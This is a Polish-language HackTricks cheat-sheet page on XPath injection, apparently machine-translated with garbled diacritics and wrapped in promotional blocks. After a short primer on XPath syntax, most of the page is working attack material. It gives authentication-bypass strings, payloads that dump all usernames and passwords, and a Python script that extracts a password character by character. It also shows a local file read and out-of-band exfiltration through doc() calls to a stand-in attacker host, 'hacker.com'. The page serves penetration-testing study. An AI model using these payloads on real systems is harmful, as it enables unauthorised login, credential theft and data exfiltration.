# XPATH injection

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Docz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serwera, aby komunikowa si z dowiadczonymi hackerami i owcami bug贸w!

**Wgld w hacking**\
Zaanga偶uj si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hackingiem

**Aktualnoci o hackingu w czasie rzeczywistym**\
Bd藕 na bie偶co z dynamicznym wiatem hackingu dziki aktualnym wiadomociom i wgldom

**Najnowsze ogoszenia**\
Bd藕 informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platform

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hackerami ju偶 dzi!

## Podstawowa skadnia

Technika ataku znana jako XPath Injection jest wykorzystywana do wykorzystania aplikacji, kt贸re tworz zapytania XPath (XML Path Language) na podstawie danych wejciowych u偶ytkownika, aby zapyta lub nawigowa po dokumentach XML.

### Opis wz贸w

Wyra偶enia s u偶ywane do wybierania r贸偶nych wz贸w w dokumencie XML. Te wyra偶enia i ich opisy s podsumowane poni偶ej:

* **nodename**: Wybierane s wszystkie wzy o nazwie "nodename".
* **/**: Wyb贸r dokonywany jest z wza g贸wnego.
* **//**: Wybierane s wzy pasujce do wyboru z bie偶cego wza, niezale偶nie od ich lokalizacji w dokumencie.
* **.**: Wybierany jest bie偶cy wze.
* **..**: Wybierany jest rodzic bie偶cego wza.
* **@**: Wybierane s atrybuty.

### Przykady XPath

Przykady wyra偶e cie偶kowych i ich wyniki obejmuj:

* **bookstore**: Wybierane s wszystkie wzy o nazwie "bookstore".
* **/bookstore**: Wybierany jest element g贸wny bookstore. Zauwa偶ono, 偶e absolutna cie偶ka do elementu jest reprezentowana przez cie偶k zaczynajc si od ukonika (/).
* **bookstore/book**: Wybierane s wszystkie elementy book, kt贸re s dziemi bookstore.
* **//book**: Wybierane s wszystkie elementy book w dokumencie, niezale偶nie od ich lokalizacji.
* **bookstore//book**: Wybierane s wszystkie elementy book, kt贸re s potomkami elementu bookstore, niezale偶nie od ich pozycji pod elementem bookstore.
* **//@lang**: Wybierane s wszystkie atrybuty o nazwie lang.

### Wykorzystanie predykat贸w

Predykaty s u偶ywane do precyzowania wybor贸w:

* **/bookstore/book\[1]**: Wybierany jest pierwszy element book bdcy dzieckiem elementu bookstore. Obejcie dla wersji IE od 5 do 9, kt贸re indeksuj pierwszy wze jako \[0], polega na ustawieniu SelectionLanguage na XPath za pomoc JavaScript.
* **/bookstore/book\[last()]**: Wybierany jest ostatni element book bdcy dzieckiem elementu bookstore.
* **/bookstore/book\[last()-1]**: Wybierany jest przedostatni element book bdcy dzieckiem elementu bookstore.
* **/bookstore/book\[position()<3]**: Wybierane s dwa pierwsze elementy book bdce dziemi elementu bookstore.
* **//title\[@lang]**: Wybierane s wszystkie elementy title z atrybutem lang.
* **//title\[@lang='en']**: Wybierane s wszystkie elementy title z wartoci atrybutu "lang" r贸wn "en".
* **/bookstore/book\[price>35.00]**: Wybierane s wszystkie elementy book w bookstore z cen wiksz ni偶 35.00.
* **/bookstore/book\[price>35.00]/title**: Wybierane s wszystkie elementy title element贸w book w bookstore z cen wiksz ni偶 35.00.

### Obsuga nieznanych wz贸w

Znaki wieloznaczne s u偶ywane do dopasowywania nieznanych wz贸w:

* **\***: Pasuje do dowolnego wza elementu.
* **@**\*: Pasuje do dowolnego wza atrybutu.
* **node()**: Pasuje do dowolnego wza dowolnego rodzaju.

Dalsze przykady obejmuj:

* **/bookstore/\***: Wybiera wszystkie wzy element贸w dzieci elementu bookstore.
* **//\***: Wybiera wszystkie elementy w dokumencie.
* **//title\[@\*]**: Wybiera wszystkie elementy title z co najmniej jednym atrybutem dowolnego rodzaju.

## Przykad
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Uzyskaj dostp do informacji
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Identyfikacja i kradzie偶 schematu
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## Ominicie uwierzytelniania

### **Przykad zapyta:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **OR obejcie w u偶ytkowniku i hale (ta sama warto w obu)**
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Wykorzystywanie wstrzyknicia null**
```
Username: ' or 1]%00
```
### **Podw贸jne OR w nazwie u偶ytkownika lub hale** (jest wa偶ne tylko z 1 podatnym polem)

WA呕NE: Zauwa偶, 偶e **"i" jest pierwsz operacj wykonan**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2潞 account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## Ekstrakcja cig贸w

Wynik zawiera cigi, a u偶ytkownik mo偶e manipulowa wartociami, aby wyszukiwa:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## Blind Explotation

### **Uzyskaj dugo wartoci i wyodrbnij j przez por贸wnania:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Przykad Pythona**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Odczytaj plik
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB Wykorzystanie
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Automatyczne narzdzie

* [xcat](https://xcat.readthedocs.io/)
* [xxxpwn](https://github.com/feakk/xxxpwn)
* [xxxpwn\_smart](https://github.com/aayla-secura/xxxpwn\_smart)
* [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [XmlChor](https://github.com/Harshal35/XMLCHOR)

## Odniesienia

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [https://wiki.owasp.org/index.php/Testing\_for\_XPath\_Injection\_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing\_for\_XPath\_Injection\_\(OTG-INPVAL-010\))
* [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Docz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hackerami i owcami bug贸w!

**Wgld w Hacking**\
Zaanga偶uj si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hackingiem

**Aktualnoci Hackingowe w Czasie Rzeczywistym**\
Bd藕 na bie偶co z dynamicznym wiatem hackingu dziki aktualnym wiadomociom i wgldom

**Najnowsze Ogoszenia**\
Bd藕 informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platform

**Docz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hackerami ju偶 dzi!

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
